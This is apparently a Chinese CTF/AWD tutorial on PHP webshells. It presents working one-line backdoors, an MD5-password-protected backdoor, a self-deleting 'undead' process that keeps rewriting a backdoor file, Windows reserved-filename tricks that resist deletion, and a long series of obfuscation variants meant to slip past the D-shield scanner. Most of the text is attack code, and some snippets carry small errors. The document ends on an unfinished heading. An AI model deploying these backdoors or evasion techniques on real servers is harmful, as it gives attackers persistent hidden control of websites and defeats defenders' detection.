## 一句话木马
一句话木马，往目标网站中上传一句话木马，然后你就可以在本地通过蚁剑即可获取和控制整个网站目录，
![在这里插入图片描述](https://img-blog.csdnimg.cn/20201102190700570.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMwMzY1NTEx,size_16,color_FFFFFF,t_70#pic_center)
然后可以再上传大马（小马传大马）
# md5马
 在awd中，假设你上传的木马被别的队发现，由于一句话木马的密码是明文在php代码中
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20201102191137785.png#pic_center)
 容易被别的队利用，所以我们要对后门加密，由于MD5加密一般不可逆，所以我们用MD5加密

```php
 <?php if(md5($_GET["pass"])=="9f0863dd5f0256b0f586a7b523f8cfe8"){@eval($_POST[shell]);}
```
只有get上去的pass=加密的pass，才能连接这个后门，防止被别人利用
# 不死马
![在这里插入图片描述](https://img-blog.csdnimg.cn/20201102191921290.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMwMzY1NTEx,size_16,color_FFFFFF,t_70#pic_center)
不死马分为两种系统预留名不死马和php进程马
## 系统预留名不死马
aux|prn|con|nul|com1|com2|com3|com4|com5|com6|com7|com8|com9|lpt1|lpt2|lpt3|lpt4|lpt5|lpt6|lpt7|lpt8|lpt9
以这些做文件名不可以用常规化删除，只能用指令来改名或删除
### 创造
```powershell
copy 原文件 \\.\<文件绝对路径>
```
### 删除

```powershell
del \\.\<文件绝对路径>
```
# php进程马
原理是创建一个代码用来定时向目标写入后门，并且利用php删除文件后，进程还在，这个进程将不断向服务器写入后门，并且删除自己来隐藏

```php
<?php 
ignore_user_abort(true);     //与用户断开连接后进程不停止
set_time_limit(0);          //设置最大执行时间，0为无限制
unlink(__FILE__);          //删除自己来隐藏
$file = 'ma.php';
$code = '<?php if(md5($_GET["pass"])=="9f0863dd5f0256b0f586a7b523f8cfe8"){@eval($_POST[a]);} ?>';
while (1){                //死循环
    file_put_contents($file,$code);
    usleep(666);
}
?>
```
然后访问不死马文件，使进程开始工作，过一会将无法访问该文件（404）
这时不死马开始工作
## 杀马
1.重启apache服务（最保险）
2.`kill -9 -1` 这条命令可以杀掉当前用户下面的所有进程

# 免杀
D盾会对，eavl，assert关键字进行捕捉我们要将他们打乱
## base64_decode（）
base64_decode（）函数它会把自己不认识的字符自动过滤掉，来重新组合进行解码
`base64_decode（"ZX说Z何hb不A=="）`=eval实现绕过
 ## php变量

```php
<?php 
$a = "assert";
$a(@$_POST['shell']); 
?>
```

第三行使用了变量函数$a，变量储存了函数名asse，便可以直接用变量替代函数名。
## php变量简单变形1

```php
<?php  
$a="TR"."Es"."sA";  
$b=strtolower($a);  
$c=strrev($b);  
@$c($_POST['shell']);  
?>
```

使用字符串拼接、大小写混淆、字符串逆序组合而成

## php变量简单变形2

```php
<?php  
$a="AssERT";  
$b=strtolower($a);  
@$b($_POST['shell']);  
?>
```

使用大小写混淆配合字符串转小写函数strtolower组合而成

## PHP可变变量

```php
<?php
$bb="assert";
$a='bb';
$$aa($_POST['shell']);
?>
```

以上代码可表示为$$aa = $($aa) = $ (‘bb’) = $bb = "assert"

## 自定义函数

```php
<?php  
function fun($a){  
    @eval($a);  
}  
@fun($_POST['shell']);  
?>
```

使用function自定义函数，然后函数来调用eval函数

## create_function函数

```php
<?php 
$fun = create_function('',$_POST['shell']);
$fun();
?>
```

创建了一个匿名函数，并返回了一个独一无二的函数名，然后再调用此函数

## call_user_func()函数

```php
<?php
@call_user_func(assert,$_POST['shell']);
?>
```

call_user_func()函数的第一个参数是被调动的函数，剩下的参数（可有多个参数）是被调用函数的参数


## preg_replace函数

```php
<?php   
    function fun(){  
        return $_POST['shell'];  
    }  
    @preg_replace("/test/e", fun(), "test123");  
?>
```

preg_replace 函数一个参数是一个正则表达式，按照 php的格式，表达式在两个/之间，如果在表达式末尾加上一个 e，则第二个参数就会被当做 php代码执行。

## pares_str函数

```php
<?php
$str="a=eval";
parse_str($str);
$a($_POST['shell']);
?>
```

执行pares_str函数后可以生成一个名为$a，值为"eval"的变量。

## str_replace函数

```php
<?php 
$a = str_replace("test", "", "astestsert");
$a($_POST['shell']);
?>
```
## 通过PHP的动态函数方法执行一句话。

```php
<?php
$a = 'assert';
$b = '_GET';
$a($$b['mu']); //assert($_GET['mu'])
```
## 利用php异或^构造字符串 
 PHP有一特性当两个字符串执行异或，会得到一个字符串，如果某位不同则该位为1, 否则该位为0。可以通过两个非字母字符串构造a-z任意字母

```php
 <?php
$_=(''^'`').(''^'`').(''^'`');//ass
$__=(''^'`').(''^'`').(''^'`'); //ert
$_ = $_.$__;//assert
$__='_'.('\''^'`').('%'^'`').('4'^'`'); //_GET
$___=$$__;
@$_($___[_]); //@assert($_GET[_])
?>
```
## 数字运算构造木马

通过运算，得到相应的acsii，然后转为相应的字符，构造一句话。

<?php
$_=chr(floor(pow(pi(),4))).chr(115).chr(115).chr(101).chr(114).chr(116);
$__='_'.chr(71).chr(69).chr(84);
$___=$$__;
$_($___[_]);
?>

    1
    2
    3
    4
    5
    6

4.内存木马，也称不死马

